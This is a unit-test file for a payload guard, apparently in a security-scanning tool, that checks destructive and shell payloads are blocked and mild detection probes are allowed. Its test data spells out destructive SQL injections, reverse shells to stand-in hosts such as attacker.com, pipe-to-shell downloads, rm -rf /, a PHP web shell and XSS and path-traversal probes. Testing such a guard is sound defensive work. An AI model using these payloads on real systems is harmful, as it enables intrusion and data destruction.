"""Unit tests for the payload guard (security boundary)."""
from __future__ import annotations

import pytest

from lib.exceptions import PayloadGuardError
from lib.payload_guard import (
    assert_payload_allowed,
    is_destructive_sql,
    is_shell_payload,
    validate_payload,
    validate_tool_command,
)


@pytest.mark.parametrize(
    "payload",
    [
        "'; DROP TABLE users;--",
        "1'; DELETE FROM transactions;--",
        "1' OR 1=1; UPDATE users SET role='admin'--",
        "1'; INSERT INTO admins VALUES ('x');--",
        "'; TRUNCATE TABLE sessions;--",
        "'; ALTER TABLE users ADD COLUMN backdoor TEXT;--",
    ],
)
def test_destructive_sql_blocked(payload: str):
    allowed, reason = validate_payload(payload)
    assert allowed is False
    assert "SQL" in reason
    assert is_destructive_sql(payload) is True


@pytest.mark.parametrize(
    "payload",
    [
        "nc -e /bin/sh attacker.com 4444",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "wget http://evil/x.sh | bash",
        "curl http://evil/x.sh | sh",
        "powershell -enc SQBFAFgA",
        "rm -rf /",
        "<?php system($_GET['c']); ?>",
        "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f",
    ],
)
def test_shell_and_implant_payloads_blocked(payload: str):
    allowed, reason = validate_payload(payload)
    assert allowed is False
    assert is_shell_payload(payload) is True


@pytest.mark.parametrize(
    "payload",
    [
        "<img src=x onerror=alert(1)>",
        "' AND '1'='1",
        "1' AND SLEEP(5)--",
        "$(sleep 5)",
        "{{7*7}}",
        "../../../../etc/passwd",
        "alert(1)",
        "gopher://127.0.0.1",
    ],
)
def test_detection_payloads_allowed(payload: str):
    allowed, _reason = validate_payload(payload)
    assert allowed is True


def test_assert_payload_allowed_raises():
    with pytest.raises(PayloadGuardError):
        assert_payload_allowed("'; DROP TABLE users;--")


def test_empty_payload_allowed():
    assert validate_payload("")[0] is True


def test_tool_command_blocks_destructive_binaries():
    assert validate_tool_command(["rm", "-rf", "/"])[0] is False
    assert validate_tool_command(["format", "C:"])[0] is False
    assert validate_tool_command(["nc", "-e", "/bin/sh", "x", "1"])[0] is False


def test_tool_command_allows_normal_tools():
    assert validate_tool_command(["nuclei", "-u", "https://x", "-t", "cves/"])[0] is True
    assert validate_tool_command(["dalfox", "url", "https://x"])[0] is True


def test_tool_command_blocks_string_form():
    assert validate_tool_command("rm -rf /")[0] is False


def test_tool_command_blocks_download_execute():
    assert validate_tool_command(["sh", "-c", "curl http://x | sh"])[0] is False
